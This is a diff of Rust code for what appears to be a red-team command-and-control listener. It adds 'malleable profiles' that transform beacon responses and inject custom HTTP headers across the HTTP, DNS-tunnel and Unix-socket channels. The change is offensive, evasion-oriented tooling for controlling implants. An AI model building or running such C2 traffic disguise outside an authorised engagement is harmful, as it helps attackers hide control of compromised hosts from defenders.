@@ -4,6 +4,7 @@ use super::console;
 use super::crypto;
 use super::dns_codec::{self, DnsKind};
 use super::engagement::{Engagement, Role};
+use super::malleable::{self, MalleableProfile};
 use super::modules;
 use super::protocol::{
     Beacon, BeaconResponse, EncryptedEnvelope, Task, TaskResult, PROTOCOL_V1, PROTOCOL_V2,
@@ -28,6 +29,7 @@ pub struct State {
     pub agents: HashMap<String, serde_json::Value>,
     pub queue: HashMap<String, VecDeque<Task>>,
     pub results: Vec<TaskResult>,
+    pub profile: Option<MalleableProfile>,
     /// DNS fragment reassembly: key = peer+kind fingerprint → ordered frags
     pub dns_frags: HashMap<String, Vec<dns_codec::DnsC2Message>>,
 }
@@ -57,7 +59,10 @@ pub fn listener_start_with(eng: &Engagement, engage_dir: &Path, opts: ListenOpts
 
     fs::create_dir_all(engage_dir.join("listeners"))?;
     fs::create_dir_all(engage_dir.join("tasks"))?;
-    let state = Arc::new(Mutex::new(State::default()));
+    let profile = malleable::load_from_engage(engage_dir);
+    let mut initial_state = State::default();
+    initial_state.profile = profile;
+    let state = Arc::new(Mutex::new(initial_state));
 
     let use_mtls = opts.mtls || eng.mtls_listen;
     if use_mtls && !eng.mtls_ready {
@@ -253,8 +258,10 @@ fn handle_http(
                 return Ok(());
             }
             let resp = process_beacon(eng, engage_dir, state, &beacon)?;
-            let out = encode_response(eng, &beacon.agent_id, &resp)?;
-            write_raw(stream, 200, out.as_bytes())?;
+            let profile = state.lock().unwrap().profile.clone();
+            let out = encode_response(eng, &beacon.agent_id, &resp, profile.as_ref())?;
+            let extra = profile.as_ref().map_or(String::new(), |p| p.format_server_headers());
+            write_raw_profiled(stream, 200, out.as_bytes(), &extra)?;
         }
         ("POST", "/result") => {
             let result = decode_result(eng, &body)?;
@@ -512,7 +519,8 @@ fn process_dns_qname(
                 return Ok(vec!["DENY".into()]);
             }
             let resp = process_beacon(eng, engage_dir, state, &beacon)?;
-            let out = encode_response(eng, &beacon.agent_id, &resp)?;
+            let profile = state.lock().unwrap().profile.clone();
+            let out = encode_response(eng, &beacon.agent_id, &resp, profile.as_ref())?;
             Ok(dns_codec::encode_txt_payload(out.as_bytes()))
         }
         DnsKind::Result => {
@@ -608,7 +616,8 @@ fn uds_loop(eng: &Engagement, engage_dir: &Path, state: Arc<Mutex<State>>) -> Re
         }
         if let Ok(beacon) = decode_beacon(eng, buf.trim()) {
             let resp = process_beacon(eng, engage_dir, &state, &beacon)?;
-            let out = encode_response(eng, &beacon.agent_id, &resp)?;
+            let profile = state.lock().unwrap().profile.clone();
+            let out = encode_response(eng, &beacon.agent_id, &resp, profile.as_ref())?;
             let _ = stream.write_all(out.as_bytes());
         } else if let Ok(result) = decode_result(eng, buf.trim()) {
             store_result(engage_dir, &state, result)?;
@@ -731,8 +740,13 @@ fn open_encrypted_json<T: serde::de::DeserializeOwned>(eng: &Engagement, raw: &[
     })
 }
 
-fn encode_response(eng: &Engagement, agent_id: &str, resp: &BeaconResponse) -> Result<String> {
-    if eng.encrypt_beacons {
+fn encode_response(
+    eng: &Engagement,
+    agent_id: &str,
+    resp: &BeaconResponse,
+    profile: Option<&MalleableProfile>,
+) -> Result<String> {
+    let raw = if eng.encrypt_beacons {
         let blob = crypto::seal_json(&eng.psk_hex, resp)?;
         let env = EncryptedEnvelope {
             protocol: PROTOCOL_V2.into(),
@@ -740,9 +754,16 @@ fn encode_response(eng: &Engagement, agent_id: &str, resp: &BeaconResponse) -> R
             agent_id: agent_id.into(),
             blob,
         };
-        Ok(serde_json::to_string(&env)?)
+        serde_json::to_string(&env)?
     } else {
-        Ok(serde_json::to_string(resp)?)
+        serde_json::to_string(resp)?
+    };
+
+    if let Some(p) = profile {
+        let transformed = p.apply_transform(raw.as_bytes());
+        Ok(String::from_utf8_lossy(&transformed).into_owned())
+    } else {
+        Ok(raw)
     }
 }
 
@@ -865,6 +886,15 @@ fn write_html(stream: &mut impl Write, status: u16, html: &str) -> Result<()> {
 }
 
 fn write_raw(stream: &mut impl Write, status: u16, payload: &[u8]) -> Result<()> {
+    write_raw_profiled(stream, status, payload, "")
+}
+
+fn write_raw_profiled(
+    stream: &mut impl Write,
+    status: u16,
+    payload: &[u8],
+    extra_headers: &str,
+) -> Result<()> {
     let reason = match status {
         200 => "OK",
         403 => "Forbidden",
@@ -874,7 +904,7 @@ fn write_raw(stream: &mut impl Write, status: u16, payload: &[u8]) -> Result<()>
     };
     write!(
         stream,
-        "HTTP/1.1 {status} {reason}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+        "HTTP/1.1 {status} {reason}\r\nContent-Type: application/json\r\nContent-Length: {}\r\n{extra_headers}Connection: close\r\n\r\n",
         payload.len()
     )?;
     stream.write_all(payload)?;
